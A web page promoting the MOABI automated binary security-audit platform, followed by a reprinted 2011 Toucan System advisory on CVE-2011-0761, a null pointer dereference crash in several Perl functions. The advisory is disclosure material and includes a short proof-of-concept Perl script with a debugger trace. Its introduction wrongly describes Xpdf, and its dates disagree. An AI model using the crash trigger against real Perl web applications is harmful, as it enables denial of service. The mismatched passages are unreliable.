###### Introducing the MOABI tool

### Start and check product security today

* **Protect your customers**: Prevent software **bugs**, **weaknesses**, and **vulnerabilities** from spreading from **suppliers** and **R&D** to your **end users**.
* **Rigorous supplier selection**: Use **systematic** and **consistent cybersecurity criteria** to choose your **partners**.
* **Benchmarking**: Analyze the **security** of your **suppliers’ products** against others, and track their **improvements** between releases.
* **Rapid validation**: Validate the **cybersecurity posture** of a **product** or **project** in just a few hours.

The **MOABI platform** offers **automated security audits** and **key performance indicators** to assess **product security**. **MOABI** automates the **analysis** and **testing** of thousands of **software products**, without requiring **source code**, based on **security standards**, **best practices**, and the detection of **known vulnerabilities** and **0-Days** to improve **product security**.

#### Frequently asked questions

     How does the MOABI platform improve product security without access to source code?

MOABI uses an advanced binary analysis approach and testing techniques to identify potential vulnerabilities, weaknesses and risks, without requiring access to the source code. This automates security assessment while respecting suppliers’ intellectual property.

     What are the advantages of MOABI's automated security audits over manual audits?

MOABI’s automated audits are not only faster and more accurate, they also offer extensive coverage thanks to key performance indicators (KPIs). They enable constant, objective assessment, helping to identify security gaps and define corrective actions proactively.

     How quickly can I get an assessment of a product's cybersecurity posture with MOABI?

The time required to obtain an evaluation depends on the size and complexity of the product, as well as the deployment mode and resources allocated. On average, the platform can analyze up to 10,000 binaries every 4 hours.

     Does MOABI deal with 0-days vulnerabilities in software?

MOABI is designed to identify known vulnerabilities as well as 0-days thanks to its innovative approach and in-depth analysis. This ability to detect new threats before they are exploited is a strategic advantage for our customers, enabling them to proactively improve their cybersecurity posture.

“We use MOABI to continually improve our Softwaree Development Life Cycle and check complex projects for flawlessness before they go into production. It’s a unique and useful product to have in your toolbox. The “0-days” function is real, as Moabi not only detects obvious flaws but goes deep into binaries to assess any potential flaws, then formalises a report with a clear description, with help for problem resolution. Finally, the support team is very responsive.”

\* Perl : multiple functions null pointer dereference \*
\* uppon parameters injection \*
------------------------------------------------------------------------

--[ Vulnerability Summary:
Date Published: 03/05/2011
Last Update: 03/05/2011
Advisory ID: TSSA-2011-03
CVE Name: CVE-2011-0761
Title: Perl : multiple functions null pointer dereference
Remotely Exploitable: Yes
Locally Exploitable: No
Impact: Remote DoS
Advisory URL: http://www.toucan-system.com/advisories/tssa-2011-03.txt
--[ Introduction:
Following 3 paragraphs taken from the vendors' documentation:
Xpdf is an open source viewer for Portable Document Format (PDF)
files. (These are also sometimes also called 'Acrobat' files, from
the name of Adobe's PDF software.) The Xpdf project also includes a
PDF text extractor, PDF-to-PostScript converter, and various other
utilities.
Xpdf runs under the X Window System on UNIX, VMS, and OS/2. The non-X
components (pdftops, pdftotext, etc.) also run on Win32 systems and
should run on pretty much any system with a decent C++ compiler.
Xpdf is designed to be small and efficient. It can use Type 1 or
TrueType fonts.
--[ Synopsis:
When given a wrong number of arguments, a number of perl functions
will attempt to read memory from an unmapped location, resulting
in a deterministic crash.
--[ Vulnerability overview:
The perl functions vulnerable to this attack are:
getpeername()
readdir()
closedir()
getsockname()
readdir()
rewinddir()
tell()
telldir()
When given a wrong number of arguments, those functions will
attempt to perform a comparison between an unalocated memory
zone and a given register, resulting in a segmentation fault:
jonathan@blackbox:~/test$ cat poc1.pl
#!/usr/bin/perl
$a =
getsockname(9505,4590,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAA",17792);
jonathan@blackbox:~/test$ perl poc1.pl
Segmentation fault (core dumped)
jonathan@blackbox:~/test$
More precisely, the Perl\_gv\_IOadd() function is invoqued and
attempts to perform a comparison:
gdb $ r ./poc1.pl
[Thread debugging using libthread\_db enabled]
Program received signal SIGSEGV, Segmentation fault.
---------------------------------------------------------------[regs]
eax:08178008 ebx:00000000 ecx:080C53B0 edx:000000F4 eflags:00210282
esi:00000000 edi:0817D554 esp:BFFFF640 ebp:BFFFF658 eip:08082B42
cs:0073 ds:007B es:007B fs:0000 gs:0033 ss:007B o d I t S z a p c
[0073:08082B42]------------------------------------------------[code]
--[ Instruction:
=> 0x8082b42 <Perl\_gv\_IOadd+18>: cmp BYTE PTR [ebx+0x8],0x9
The register ebx being null, the application actually tries to
read from the (unmapped) first page, resulting in a null
pointer dereference, and eventually a crash.
--[ Impact:
Perl not being a compiled language, injection of wrong number of
parameters is technically possible (in very much the same way as
say, sql injections).
It is in any case not possible to execute code directly using this
vulnerability as null pointers dereferences in the first page are not
exploitable under modern OSes.
But, if a given third party perl web application was calling one
of the above listed vulnerable functions in a way allowing
parameter injections, while performing a critical operation
requiring some degree of atomicity, it would be possible to
interrupt the execution of this operation before it completes,
hence breaking the business logic assumptions of the web
applications designers.
Wether this vulnerability actually allows to steal millions from
widespread perl web applications has not been investigated and
won't be dulled about.
--[ Vulnerable versions:
Vulnerable : Perl version 5.10.x.
In particular, versions 5.10.1 of perl as shipped with ubuntu
10.04 and 10.10 as well as version 5.10.0 provided with OSX
10.6 are known to be vulnerable.
Non vulnerable : Perl version <= 5.10.0 OR >= 5.12.0.
--[ Disclosure timeline:
\* 05/01/2011: Toucan System contacts the CERT, providing full
description and PoC samples to audit the issue.
\* 10/02/2011: The CERT is able to replicate the bug under both
ubuntu 10.04 and ubuntu 10.10, and therefor forwards the PoCs
to the perl team.
\* 11/02/2011: The Perl Team acknowledge the vulnerability and starts
investigating which exact versions are vulnerable.
\* 11/02/2011: The CERT assigns CVE-2011-0761 to this vulnerability.
\* 15/02/2011: The Perl Team notifies us that stable version 5.12.0
is not vulnerable to this bug.
\* 18/04/2011: Public disclosure.
